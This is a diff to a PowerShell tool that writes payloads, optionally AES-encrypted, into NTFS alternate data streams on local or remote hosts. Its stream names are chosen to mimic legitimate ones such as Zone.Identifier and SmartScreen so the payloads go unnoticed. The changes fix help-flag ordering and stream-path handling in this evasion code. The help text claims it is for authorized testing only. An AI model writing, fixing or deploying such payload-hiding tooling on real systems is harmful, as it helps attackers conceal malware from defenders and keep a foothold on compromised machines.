@@ -152,14 +152,6 @@ param(
     [switch]$Help
 )
 
-# Help flag intercept
-if ($Help -or $args -contains '-h' -or $args -contains '--help' -or 
-    $args -contains '-?' -or $args -contains '/?' -or 
-    (!$PSBoundParameters.ContainsKey('Payload') -and $args.Count -eq 0)) {
-    Show-Help
-    exit 0
-}
-
 # Help display function
 function Show-Help {
     $helpText = @"
@@ -207,6 +199,14 @@ ETHICAL USE ONLY - AUTHORIZED TESTING WITH PERMISSION REQUIRED
 Write-Host $helpText -ForegroundColor Cyan
 }
 
+# Help flag intercept
+if ($Help -or $args -contains '-h' -or $args -contains '--help' -or 
+    $args -contains '-?' -or $args -contains '/?' -or 
+    (!$PSBoundParameters.ContainsKey('Payload') -and $args.Count -eq 0)) {
+    Show-Help
+    exit 0
+}
+
 # Main Code
 if ($Targets -notcontains 'localhost' -and -not $Credential) {
     throw "Remote targets require -Credential parameter"
@@ -232,9 +232,9 @@ function Get-RandomADSConfig {
     $sha256 = [System.Security.Cryptography.SHA256]::Create()
     $keyBytes = $sha256.ComputeHash([Text.Encoding]::UTF8.GetBytes($seed))
     
-    # Calculate stream name options
-    $legitimateStreams = @('Zone.Identifier', 'SmartScreen', 'Catalog', 'appcompat.txt')
-    $randomStream = -join (1..8 | ForEach-Object { [char](Get-Random -Minimum 97 -Maximum 122) })
+    # Stream name options (WITH colon prefix)
+    $legitimateStreams = @(':Zone.Identifier', ':SmartScreen', ':Catalog', ':appcompat.txt')
+    $randomStream = ':' + (-join (1..8 | ForEach-Object { [char](Get-Random -Minimum 97 -Maximum 122) }))
     
     # Return configuration hashtable
     @{
@@ -245,7 +245,7 @@ function Get-RandomADSConfig {
         }
         
         StreamName = if($Randomize) { 
-            ':' + (Get-Random -InputObject ($legitimateStreams + $randomStream))
+            Get-Random -InputObject ($legitimateStreams + $randomStream)
         } else { 
             ':syc_payload' 
         }
@@ -306,15 +306,26 @@ function Protect-Payload($Payload, $KeyB64) {
 
 function New-ADSPayload($HostPath, $StreamName, $Payload, $Config) {
     try {
+        # Ensure host file exists
         if(!(Test-Path $HostPath)) { 
-            '' | Out-File $HostPath -Encoding ASCII -ErrorAction Stop 
+            New-Item -Path $HostPath -ItemType File -Force -ErrorAction Stop | Out-Null
         }
         
-        $finalPayload = if($Encrypt) { Protect-Payload $Payload $Config.AESKey } else { $Payload }
-        $finalPayload | Out-File "$HostPath$StreamName" -Encoding UTF8 -Force -ErrorAction Stop
+        # Prepare payload
+        $finalPayload = if($Encrypt) { 
+            Protect-Payload $Payload $Config.AESKey 
+        } else { 
+            $Payload 
+        }
         
-        Write-Host "ADS Created: $HostPath$StreamName" -ForegroundColor Green
-        return "$HostPath$StreamName"
+        $cleanStreamName = $StreamName.TrimStart(':')
+        $adsPath = "${HostPath}:${cleanStreamName}"
+        
+        # Write payload to ADS
+        Set-Content -Path $adsPath -Value $finalPayload -Encoding UTF8 -Force -ErrorAction Stop
+        
+        Write-Host "ADS Created: $adsPath" -ForegroundColor Green
+        return $adsPath
         
     } catch {
         Write-Error "Failed to create ADS: $_"
